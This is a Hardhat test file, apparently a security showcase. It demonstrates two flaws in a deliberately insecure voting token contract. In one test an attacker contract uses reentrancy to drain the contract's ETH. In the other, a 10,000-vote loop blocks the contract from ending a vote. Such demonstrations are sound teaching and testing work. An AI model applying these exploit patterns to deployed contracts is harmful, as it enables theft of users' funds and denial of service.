import { expect } from "chai";
import { network } from "hardhat";
import { deployFixture, TOKEN_NAME, SYMBOL } from "./fixtures.js";
import { HardhatEthers } from "@nomicfoundation/hardhat-ethers/types";
import { NetworkHelpers } from "@nomicfoundation/hardhat-network-helpers/types";
import { AttackerReentry, InsecureCoolToken } from "../../types/ethers-contracts/index.js";

let _ethers: HardhatEthers;
let _networkHelpers: NetworkHelpers;

function localFixture() {
  return deployFixture(_ethers);
}

let ONE_ETH: bigint;
let ONE_TOKEN: bigint;
let DECIMALS: bigint;

describe("Security showcases", function () {
    let token: InsecureCoolToken;
    let attacker: AttackerReentry;
    let user1: any;
    let user2: any;

    beforeEach(async function () {
        const networkConnection = await network.connect();
        _ethers = networkConnection.ethers;
        _networkHelpers = networkConnection.networkHelpers;
        ({ token, attacker, user1, user2 } =
        await _networkHelpers.loadFixture(localFixture));
        DECIMALS = await token.decimals();
        ONE_ETH = _ethers.parseEther("1.0");
        ONE_TOKEN = _ethers.parseUnits("1", DECIMALS);
    });


    it('Attacker should be able to exploit InsecureCoolToken claim method with Reentrancy', async function(){

        const ETH_SUPPLY: bigint = ONE_ETH*1000n;
        const attackerContractAddress = await attacker.getAddress();
        const tokenContractAddress = await token.getAddress();
        

        await token.buy({
            value: ETH_SUPPLY
        });
        
        
        await token.startVoting();
        expect(await token.isVotingInProgress()).to.be.true;

        const priceToVote: bigint = ONE_ETH/2n;
        const tokensVoted: bigint = await token.balanceOf(user1.address) / 10n;
        const votingRound: bigint = await token.votingNumber();
        const tip: bigint = ONE_ETH * 2n;

        expect( 
            await token.vote(
                priceToVote, 
                tokensVoted,
                {
                    value: tip
                }
            )
        ).to.changeEtherBalances(
            _ethers,
            [user1.address, tokenContractAddress],
            [-tip, tip]
        ); 

        expect(await token.voterTipByPrice(votingRound, priceToVote, user1.address)).to.be.equal(tip); 
        // At this point in normal scenario user should be able to claim only one tip


        const { time } = _networkHelpers;
        const votingTimeLength: bigint = await token.votingTimeLength();
        const currentTime: bigint = BigInt(await time.latest());
        await time.increaseTo(currentTime + votingTimeLength + 1n);

        await token.endVoting();

        expect(await token.isVotingInProgress()).to.be.false;

        expect(await _ethers.provider.getBalance(attackerContractAddress)).to.be.equal(0n); 

        await attacker.attack(user1.address, votingRound, priceToVote); 
        //this attack allows to get all the eth on the token contract balance

        const finalNet: bigint = await _ethers.provider.getBalance(attackerContractAddress);
        expect(finalNet).to.be.gt(tip); //attack is successful if we got more ETH than was supposed
    });

    it('Attacker should be able to dos contract', async function() {
        this.timeout(300000);
        await token.buy({
            value: ONE_ETH*1000n
        });

        const totalBalance = await token.balanceOf(user1.address);

        await token.startVoting();

        expect(await token.isVotingInProgress()).to.be.true;
        
        const dosRounds = 10000n
        const tokenDosAmount = totalBalance/dosRounds;

        for(let i = 1n; i<=dosRounds; i++){
            await token.vote(i,tokenDosAmount);
        }

        const { time } = _networkHelpers;
        const votingTimeLength: bigint = await token.votingTimeLength();
        const currentTime: bigint = BigInt(await time.latest());
        await time.increaseTo(currentTime + votingTimeLength + 1n);

        await expect(token.endVoting()).to.be.revert(_ethers);
    });

});